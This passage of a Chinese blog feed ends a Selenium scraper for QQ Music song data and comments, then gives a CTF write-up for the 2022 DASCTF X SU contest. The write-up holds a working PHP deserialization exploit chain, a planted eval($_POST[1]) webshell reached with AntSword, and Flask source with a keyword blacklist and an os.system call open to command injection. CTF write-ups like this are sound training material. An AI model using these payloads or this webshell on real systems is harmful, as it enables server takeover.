= csv.writer(csv_file)</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line">song_url_list=[]</span><br><span class="line">song_resourses=[]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取前五首歌曲的url</span></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> driver.find_elements(by=By.XPATH,value=<span class="string">&#x27;//div/span/a&#x27;</span>):</span><br><span class="line">    url = link.get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (url):</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        song_url_list.append(url)</span><br><span class="line">song_url_list = song_url_list[<span class="number">0</span>:<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(song_url_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已获取当前歌手热门歌曲列表前五首的url&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一首歌曲所需要的信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSongResourse</span>(<span class="params">url</span>):</span></span><br><span class="line">    song_resourse = &#123;&#125;</span><br><span class="line">    song_list = []</span><br><span class="line">    song_comment_list = []</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="comment"># 这个1.8秒用于等待页面所有异步请求的完成</span></span><br><span class="line">    sleep(<span class="number">1.8</span>)</span><br><span class="line">    song_name = driver.find_element(by=By.CLASS_NAME, value=<span class="string">&quot;data__name_txt&quot;</span>).text</span><br><span class="line">    <span class="comment">#歌名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始获取歌曲《&quot;</span> + song_name + <span class="string">&quot;》的基本信息&quot;</span>)</span><br><span class="line">    songs = driver.find_elements(by=By.CLASS_NAME, value=<span class="string">&#x27;data_info__item_song&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> songs:</span><br><span class="line">            song_list.append(i.text)</span><br><span class="line">            <span class="comment"># print(song_list)</span></span><br><span class="line">        song_liupai = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        song_liupai = song_list[<span class="number">2</span>][<span class="number">3</span>:]</span><br><span class="line">        <span class="comment">#流派</span></span><br><span class="line">        song_time = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        song_time = song_list[<span class="number">4</span>][<span class="number">5</span>:]</span><br><span class="line">        <span class="comment">#发行时间</span></span><br><span class="line">        song_comment = driver.find_elements(by=By.CLASS_NAME,value=<span class="string">&#x27;mod_btn&#x27;</span>)</span><br><span class="line">        <span class="keyword">global</span> song_comment_num</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> song_comment:</span><br><span class="line">            <span class="comment"># print(i.text)</span></span><br><span class="line">            song_comment_list.append(i.text)</span><br><span class="line">        song_comment_num = song_comment_list[<span class="number">2</span>][<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#评论数</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该歌曲可能信息缺失导致信息有误&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;流派为: &quot;</span> + song_liupai)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发行时间为: &quot;</span> + song_time)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;评论数为: &quot;</span> + song_comment_num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;歌曲《&quot;</span> + song_name + <span class="string">&quot;》基本信息获取完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始获取歌曲《&quot;</span> + song_name + <span class="string">&quot;》的歌词&quot;</span>)</span><br><span class="line">    driver.find_element(by=By.PARTIAL_LINK_TEXT, value=<span class="string">&quot;[展开]&quot;</span>).click()</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    lyic = <span class="string">&quot;&quot;</span></span><br><span class="line">    lyic_box = driver.find_element(by=By.ID,value=<span class="string">&quot;lrc_content&quot;</span>).find_elements(by=By.TAG_NAME,value=<span class="string">&quot;p&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> lyic_box:</span><br><span class="line">        <span class="keyword">if</span> l.text != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            lyic += l.text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(lyic)</span><br><span class="line">    <span class="comment">#歌词</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;歌曲《&quot;</span> + song_name + <span class="string">&quot;》的歌词获取完毕&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始获取歌曲《&quot;</span> + song_name + <span class="string">&quot;》的热门评论&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            element = driver.find_element(by=By.PARTIAL_LINK_TEXT, value=<span class="string">&quot;更多精彩评论&quot;</span>)</span><br><span class="line">            driver.execute_script(<span class="string">&quot;arguments[0].click();&quot;</span>, element)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#爬取评论前先点40次更多精彩评论，凑够数量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;点击完毕，开始爬取数据&quot;</span>)</span><br><span class="line">    comments = []</span><br><span class="line">    comment = &#123;&#125;</span><br><span class="line">    zan = []</span><br><span class="line">    comment_zan = driver.find_elements(by=By.XPATH, value=<span class="string">&#x27;//div/div/div/ul/li/div/div/a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> comment_zan:</span><br><span class="line">        <span class="keyword">if</span> (i.text):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                flag = <span class="built_in">eval</span>(i.text)</span><br><span class="line">                zan.append(<span class="built_in">str</span>(flag))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zan.append(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    zan = zan[<span class="number">1</span>:<span class="number">501</span>]</span><br><span class="line">    <span class="comment">#爬取点赞量 这里的难点是只爬主评论的点赞量 不爬回帖的点赞量</span></span><br><span class="line">    <span class="built_in">print</span>(zan)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(zan))</span><br><span class="line"></span><br><span class="line">    date = []</span><br><span class="line">    comment_date = driver.find_elements(by=By.CLASS_NAME, value=<span class="string">&quot;comment__date&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> comment_date:</span><br><span class="line">        <span class="keyword">if</span> (i.text):</span><br><span class="line">            <span class="comment"># print(i.text)</span></span><br><span class="line">            date.append(i.text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            date.append(<span class="string">&#x27;未爬取到时间&#x27;</span>)</span><br><span class="line">    date = date[<span class="number">0</span>:<span class="number">500</span>]</span><br><span class="line">    <span class="comment">#爬取点赞时间</span></span><br><span class="line">    <span class="built_in">print</span>(date)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(date))</span><br><span class="line"></span><br><span class="line">    text = []</span><br><span class="line">    comment_text = driver.find_elements(by=By.XPATH, value=<span class="string">&#x27;//li/div/p&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> comment_text:</span><br><span class="line">        <span class="keyword">if</span> (i.text):</span><br><span class="line">            <span class="comment"># print(i.text)</span></span><br><span class="line">            text.append(i.text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text.append(<span class="string">&#x27;未爬取到评论内容&#x27;</span>)</span><br><span class="line">    text = text[<span class="number">0</span>:<span class="number">500</span>]</span><br><span class="line">    <span class="comment">#爬取评论内容</span></span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(date)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            comment = &#123;&#125;</span><br><span class="line">            comment.update(&#123;<span class="string">&quot;评论时间&quot;</span>: date[i]&#125;)</span><br><span class="line">            comment.update(&#123;<span class="string">&quot;评论内容&quot;</span>: text[i]&#125;)</span><br><span class="line">            comment.update(&#123;<span class="string">&quot;评论点赞次数&quot;</span>: zan[i]&#125;)</span><br><span class="line">            comments.append(comment)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(comment)</span></span><br><span class="line">    <span class="comment">#放入字典中 然后字典在放入列表中</span></span><br><span class="line">    <span class="comment">#print(comments)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;歌曲《&quot;</span> + song_name + <span class="string">&quot;》的前五百条热门评论获取完毕&quot;</span>)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;歌曲名&quot;</span>: song_name&#125;)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;流派&quot;</span>: song_liupai&#125;)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;发行时间&quot;</span>: song_time&#125;)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;评论数&quot;</span>: song_comment_num&#125;)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;歌词&quot;</span>: lyic&#125;)</span><br><span class="line">    song_resourse.update(&#123;<span class="string">&quot;500条精彩评论&quot;</span>: comments&#125;)</span><br><span class="line">    <span class="comment">#全部信息放入字典中</span></span><br><span class="line">    <span class="built_in">print</span>(song_resourse)</span><br><span class="line">    <span class="keyword">return</span> song_resourse</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> song_page <span class="keyword">in</span> song_url_list:</span><br><span class="line">    song_resourses.append(getSongResourse(song_page))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在写入CSV文件...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> song_resourses:</span><br><span class="line">    writer.writerow([i[<span class="string">&quot;歌曲名&quot;</span>],i[<span class="string">&quot;流派&quot;</span>],i[<span class="string">&quot;发行时间&quot;</span>],i[<span class="string">&quot;评论数&quot;</span>],i[<span class="string">&quot;歌词&quot;</span>]])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="string">&quot;500条精彩评论&quot;</span>]:</span><br><span class="line">        writer.writerow([j[<span class="string">&quot;评论内容&quot;</span>],j[<span class="string">&quot;评论时间&quot;</span>],j[<span class="string">&quot;评论点赞次数&quot;</span>]])</span><br><span class="line">    writer.writerow([])</span><br><span class="line">csv_file.close()</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;爬取完成，总耗时&quot;</span>+<span class="built_in">str</span>(end-start)+<span class="string">&quot;秒&quot;</span>)</span><br></pre></td></tr></table></figure><p>大概得跑10分钟左右，最终成果如下，谦谦的歌真的太动人了：</p><p><img src="https://s2.loli.net/2022/04/12/JC3MSKEButIHVir.png" alt="image.png"></p><p>这里参考了<code>ATFWUS</code>的文章，海牛yyds，只不过我用他的代码直接跑跑不出来，可能是qq音乐改了啥的，就导致很多元素的位置变了，所以说好多元素我都是重新定了位的，当然整体框架我就用的他的啦，参考文章：<a href="https://blog.csdn.net/ATFWUS/article/details/115053245">https://blog.csdn.net/ATFWUS/article/details/115053245</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用selenium库爬取qq音乐歌曲及评论&quot;&gt;&lt;a href=&quot;#利用selenium库爬取qq音乐歌曲及评论&quot; class=&quot;headerlink&quot; title=&quot;利用selenium库爬取qq音乐歌曲及评论&quot;&gt;&lt;/a&gt;利用selenium库爬取qq音乐歌曲及评论&lt;/h1&gt;&lt;p&gt;最近学校&lt;code&gt;python&lt;/code&gt;课布置了两个爬虫实验，想着爬虫对我还挺重要的，就去学了学然后把这两个实验写了，接下来就来总结总结第二个实验也就是用&lt;code&gt;selenium&lt;/code&gt;库来爬取qq音乐中的歌曲及评论&lt;/p&gt;</summary>
    
    
    
    
    <category term="python" scheme="https://arsenetang.github.io/tags/python/"/>
    
    <category term="爬虫" scheme="https://arsenetang.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之2022DASCTF X SU 三月挑战赛</title>
    <link href="https://arsenetang.github.io/2022/03/28/WP%E7%AF%87%E4%B9%8B2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>https://arsenetang.github.io/2022/03/28/WP%E7%AF%87%E4%B9%8B2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-03-27T16:00:00.000Z</published>
    <updated>2022-03-28T04:33:56.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022DASCTF-X-SU-三月挑战赛"><a href="#2022DASCTF-X-SU-三月挑战赛" class="headerlink" title="2022DASCTF X SU 三月挑战赛"></a>2022DASCTF X SU 三月挑战赛</h1><p>这次的<code>DASCTF</code>挺难受的，比赛的时候只打出了一道web，web2其实是能出的，比赛的时候钻进死胡同里去了，而且太久没打比赛了手感也不是很好，这个比赛当恢复训练了，接下来就把这两道web题的wp写写</p><span id="more"></span><h2 id="1-ezpop"><a href="#1-ezpop" class="headerlink" title="1.ezpop"></a>1.ezpop</h2><p>这道题挺简单的，但听出题人说这是非预期，预期解是用原生类去读文件，但它都给<code>eval</code>了肯定就不用这么麻烦了嘛</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一道非常常规的pop链子的题，遇到这种题肯定还是先找起点和终点嘛，起点是<code>POST</code>传参，然后它进行了反序列化之后会进入到<code>fin</code>类中的<code>__destruct()</code>方法中，终点是<code>mix</code>类中的<code>get_flag()</code>，在里面有任意代码执行</p><p>还是从终点往前推，看哪里调用了<code>get_flag()</code>，在<code>fin</code>类的<code>__call()</code>方法中，然后在<code>crow</code>类中的<code>__invoke()</code>方法中调用了<code>world()</code>方法，由于<code>fin</code>类中没有<code>world()</code>方法，于是就会调用<code>__call()</code>，再往前看，在<code>fin</code>类的<code>run()</code>方法中可以调用<code>__invoke()</code>，然后在<code>what</code>类中的<code>__toString()</code>方法里调用了<code>run()</code>，最后在<code>__destruct()</code>中有字符串与对象的连接，会调用<code>__destruct()</code>，链子就到头了</p><p>所以说链子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; fin::__destruct() -&gt; what::__toString() -&gt; fin::run() -&gt; crow::__invoke() -&gt; fin::__call() -&gt; mix::getflag()</span><br></pre></td></tr></table></figure><p>所以说构造的exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>=<span class="string">&quot;?&gt;&lt;?php phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fin1</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$fin3</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$mix</span> = <span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fin1</span>-&gt;f1=<span class="variable">$what</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a=<span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1=<span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1=<span class="variable">$fin3</span>;</span><br><span class="line"><span class="variable">$fin3</span>-&gt;f1=<span class="variable">$mix</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$fin1</span>);</span><br></pre></td></tr></table></figure><p>找了半天没找到flag，只有构造个一句话木马连上蚁剑去找了<code>$m1=&#39;?&gt;&lt;?php eval($_POST[1]);&#39;;</code></p><p><img src="https://s2.loli.net/2022/03/28/USADKzJvyprMuPo.png" alt="image.png"></p><p>连上蚁剑找到flag：</p><p><img src="https://s2.loli.net/2022/03/28/9jDlWtdhTzxcy7q.png" alt="image.png"></p><h2 id="2-calc"><a href="#2-calc" class="headerlink" title="2.calc"></a>2.calc</h2><p>害这道题比赛的时候没做出来太伤了，还是先看源码，是<code>python</code>的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span 